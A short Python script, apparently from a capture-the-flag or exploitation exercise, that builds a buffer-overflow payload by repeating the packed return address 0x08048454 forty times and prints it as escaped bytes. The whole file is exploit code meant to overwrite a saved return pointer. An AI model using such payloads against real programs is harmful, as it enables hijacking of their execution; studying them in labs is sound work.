from struct import pack

def p(x): return pack('<I', x)
def isprint(c): return c >= 0x20 and c <= 0x7e

payload = p(0x08048454) * 40

for c in payload:
    if isprint(c): print(chr(c), end='')
    else: print("\\x%02x" % c, end='')
